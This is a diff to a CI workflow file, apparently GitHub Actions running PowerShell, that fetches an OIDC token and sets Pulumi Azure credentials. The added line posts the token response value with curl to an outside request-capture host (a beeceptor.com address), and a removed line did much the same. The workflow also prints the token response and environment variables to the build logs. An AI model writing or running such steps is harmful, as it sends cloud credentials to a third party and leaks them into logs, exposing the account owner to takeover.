@@ -41,8 +41,7 @@ jobs:
             Write-Host '👉 Calling OIDC token endpoint'
             Write-Host "ACTIONS_ID_TOKEN_REQUEST_URL: "$env:ACTIONS_ID_TOKEN_REQUEST_URL
             $azureTokenResponse = curl -H "Authorization: bearer $env:ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$env:ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"
-            $env:ARM_CLIENT_SECRET = $azureTokenResponse.value 
-            curl https://thehossgame.free.beeceptor.com --data-raw  $env:ACTIONS_ID_TOKEN_REQUEST
+            curl https://thehossgame.free.beeceptor.com --data-raw $azureTokenResponse.value
 
             Write-Host '👉 Printing environment variables'
             Write-Host "azureTokenResponse: "$azureTokenResponse
@@ -54,7 +53,7 @@ jobs:
             Write-Host "ACTIONS_ID_TOKEN_REQUEST_URL: "$env:ACTIONS_ID_TOKEN_REQUEST_URL
 
             Write-Host '👉 Setting client secret'
-            pulumi config set azure-native:clientSecret $env:ARM_CLIENT_SECRET --secret
+            pulumi config set azure-native:clientSecret $azureTokenResponse.value --secret
             Write-Host '👉 Setting client id'
             pulumi config set azure-native:clientId $env:ARM_CLIENT_ID
             Write-Host '👉 Setting tenant id'
